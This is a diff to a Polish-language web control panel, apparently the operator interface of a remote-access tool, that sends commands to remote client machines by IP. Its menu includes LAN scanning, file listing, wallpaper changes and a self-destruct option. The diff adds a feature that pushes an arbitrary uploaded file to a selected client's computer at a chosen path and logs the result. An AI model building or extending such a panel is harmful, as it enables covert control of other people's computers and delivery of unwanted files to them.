@@ -177,13 +177,21 @@
                         <option value="lan-print">Skanuj sieć LAN</option>
                         <option value="list-files">Wyświetl pliki</option>
                         <option value="change-wallpaper">Zmień tapetę</option>
+                        <option value="transfer-file">Prześlij plik</option>
                         <option value="self-destruct">Auto-destrukcja</option>
                     </select>
                 </div>
                 
                 <div class="form-group" id="extra-data-group" style="display:none;">
-                    <label for="extra-data-input">Dodatkowe dane (np. ścieżka):</label>
+                    <label for="extra-data-input">Dodatkowe dane:</label>
                     <input type="text" id="extra-data-input" placeholder="Wpisz tutaj dane...">
+                </div>
+
+                <div class="form-group" id="file-transfer-group" style="display:none;">
+                    <label for="file-input">Wybierz plik do przesłania:</label>
+                    <input type="file" id="file-input">
+                    <label for="target-path-input">Ścieżka docelowa na komputerze klienta:</label>
+                    <input type="text" id="target-path-input" placeholder="np. C:\\Users\\Public" value="automatic">
                 </div>
 
                 <button id="send-command-btn">Wyślij Komendę</button>
@@ -212,6 +220,10 @@
         const sendCommandBtn = document.getElementById('send-command-btn');
         const extraDataGroup = document.getElementById('extra-data-group');
         const extraDataInput = document.getElementById('extra-data-input');
+        
+        const fileTransferGroup = document.getElementById('file-transfer-group');
+        const fileInput = document.getElementById('file-input');
+        const targetPathInput = document.getElementById('target-path-input');
         
         const consoleOutput = document.getElementById('console-output');
         const consoleInput = document.getElementById('console-input');
@@ -263,21 +275,60 @@
         
         function checkExtraDataVisibility() {
             const commandType = commandTypeSelect.value;
+            extraDataGroup.style.display = 'none';
+            fileTransferGroup.style.display = 'none';
+            extraDataInput.value = '';
+
             if (['list-files', 'change-wallpaper'].includes(commandType)) {
                 extraDataGroup.style.display = 'flex';
                 extraDataInput.placeholder = 'Wpisz ścieżkę...';
             } else if (commandType === 'transfer-file') {
-                extraDataGroup.style.display = 'flex';
-                extraDataInput.placeholder = 'Wybierz plik do przesłania...';
-            } else {
-                extraDataGroup.style.display = 'none';
-                extraDataInput.value = '';
+                fileTransferGroup.style.display = 'flex';
+            }
+        }
+        
+        async function sendFile() {
+            const clientIP = commandClientSelect.value;
+            const file = fileInput.files[0];
+            const targetPath = targetPathInput.value;
+
+            if (!file) {
+                alert("Proszę wybrać plik do przesłania.");
+                return;
+            }
+
+            if (!clientIP || clientIP === 'all') {
+                alert("Proszę wybrać konkretnego klienta, aby wysłać plik.");
+                return;
+            }
+            
+            const formData = new FormData();
+            formData.append('file', file);
+            formData.append('client_ip', clientIP);
+            formData.append('target_path', targetPath);
+
+            try {
+                const response = await fetch(`${API_URL}/upload_file`, {
+                    method: 'POST',
+                    body: formData
+                });
+                if (!response.ok) throw new Error('Failed to upload file');
+                
+                alert('Plik wysłany pomyślnie! Komenda transferu została dodana do kolejki.');
+            } catch (error) {
+                alert(`Błąd podczas przesyłania pliku: ${error.message}`);
             }
         }
 
         async function sendCommand() {
-            const clientIP = commandClientSelect.value;
             const commandType = commandTypeSelect.value;
+            
+            if (commandType === 'transfer-file') {
+                await sendFile();
+                return;
+            }
+            
+            const clientIP = commandClientSelect.value;
             const extraData = extraDataInput.value;
             
             const payload = {
@@ -286,6 +337,10 @@
             };
             
             if (extraDataGroup.style.display !== 'none') {
+                if (!extraData) {
+                    alert('Proszę wprowadzić dodatkowe dane (np. ścieżkę).');
+                    return;
+                }
                 payload.data = { path: extraData };
             }
             
@@ -344,13 +399,17 @@
                             logMessage = `[REPORT] [${report.client_ip}] -> Wynik wykonania skryptu:\n${report.info.output}`;
                             break;
                         case 'file-transfer-complete':
+                            logClass = 'log-green';
+                            logMessage = `[REPORT] [${report.client_ip}] -> Przesyłanie pliku '${report.info.file_name}' zakończone pomyślnie. Zapisano w: ${report.info.path}.`;
+                            break;
                         case 'wallpaper-change-complete':
                             logClass = 'log-green';
                             logMessage = `[REPORT] [${report.client_ip}] -> ${report.status.replace(/-/g, ' ')}`;
                             break;
                         case 'wallpaper-change-error':
+                        case 'file-transfer-error':
                             logClass = 'log-red';
-                            logMessage = `[REPORT] [${report.client_ip}] -> Błąd zmiany tapety: ${report.info.error}`;
+                            logMessage = `[REPORT] [${report.client_ip}] -> Błąd: ${report.info.error}`;
                             break;
                     }
                     
